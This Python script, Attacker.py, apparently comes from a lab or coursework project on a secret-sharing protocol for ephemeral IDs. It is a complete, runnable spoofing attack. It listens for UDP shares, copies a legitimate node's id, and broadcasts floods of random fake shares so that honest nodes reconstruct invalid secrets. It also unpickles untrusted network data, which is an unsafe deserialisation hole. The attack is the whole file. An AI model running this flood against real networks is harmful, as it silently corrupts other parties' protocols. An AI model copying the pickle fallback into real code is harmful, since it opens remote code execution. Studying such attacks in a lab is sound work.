"""
Attacker.py

Floods fake shares under the same node_id as a legitimate node,
so that honest nodes reconstruct invalid EphIDs (breaking EncID generation silently).

Usage:
    python3 Attacker.py <listen_port> <k> <n>

Example:
    python3 Attacker.py 12345 3 5
"""

import asyncio
import logging
import json
import socket
import sys
import os
from pickle import loads as pkl_loads

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
log = logging.getLogger("Attacker")

class Attacker(asyncio.DatagramProtocol):
    def __init__(self, k, n, port):
        super().__init__()
        self.K = k  # Number of shares needed for reconstruction
        self.N = n  # Total number of shares
        self.port = port
        self.attacked = set()  # Track node_ids we've already flooded
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport
        log.info(f"[+] Listening on UDP port {self.port}")

    def datagram_received(self, data, addr):
        # Log raw data for debugging
        log.info(f"Raw data from {addr}: {data[:64].hex()}...")
        # Try JSON (honest nodes use JSON in secretSharingBroadcaster.py)
        try:
            msg = json.loads(data.decode())
            log.info(f"Parsed JSON message from {addr}: {msg}")
        except Exception:
            # Fallback to pickle if used
            try:
                msg = pkl_loads(data)
                log.info(f"Parsed pickle message from {addr}: {msg}")
            except Exception:
                log.warning(f"Failed to parse message from {addr}")
                return

        if not isinstance(msg, dict) or msg.get("type") != "share":
            log.warning(f"Ignoring non-share message from {addr}: {msg}")
            return

        node_id = msg.get("node_id")
        content = msg.get("content", {})
        eph_id_hash = content.get("eph_id_hash")
        index = content.get("index")

        if not node_id or not eph_id_hash or index is None:
            log.warning(f"Missing required fields from {addr}: {msg}")
            return

        # Only attack once per honest node
        if node_id in self.attacked:
            log.info(f"Already attacked node_id={node_id[:8]}..., skipping")
            return

        # Log the captured share
        log.info(f"[!] First legit share detected from node {node_id[:8]} — launching fake share flood.")

        # Trigger the flood under the *same* node_id
        self.attacked.add(node_id)

        # Flood each index with multiple fake copies
        for fake_idx in range(1, self.N + 1):  # Cover all indices (1 to n)
            for _ in range(10):  # Flood 10 fakes per index
                fake_share = os.urandom(32).hex()  # Random 32-byte share as hex string
                fake_msg = {
                    "node_id": node_id,
                    "type": "share",
                    "content": {
                        "index": fake_idx,
                        "eph_id_hash": eph_id_hash,
                        "share": fake_share
                    }
                }
                packet = json.dumps(fake_msg).encode()
                try:
                    self.transport.sendto(packet, ("255.255.255.255", self.port))
                    log.info(f"Flooded fake share: node_id={node_id[:8]}…, index={fake_idx}, eph_id_hash={eph_id_hash[:8]}..., share={fake_share[:8]}...")
                except Exception as e:
                    log.warning(f"Failed to send: {e}")
            log.info(f"  → Flooded 10 fake shares for index {fake_idx}")

        log.info("[✓] Attack launched: reconstruction for this node should now fail or return invalid secrets.")

    async def start(self):
        loop = asyncio.get_running_loop()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if hasattr(socket, "SO_REUSEPORT"):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.bind(("0.0.0.0", self.port))

        await loop.create_datagram_endpoint(lambda: self, sock=sock)
        await asyncio.Event().wait()

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 Attacker.py <listen_port> <k> <n>")
        sys.exit(1)
    port = int(sys.argv[1])
    k = int(sys.argv[2])
    n = int(sys.argv[3])

    log.info(f"[Attacker] Running on port {port} with k={k}, n={n}")
    try:
        asyncio.run(Attacker(k, n, port).start())
    except KeyboardInterrupt:
        log.info("[-] Attacker terminated.")

if __name__ == "__main__":
    main()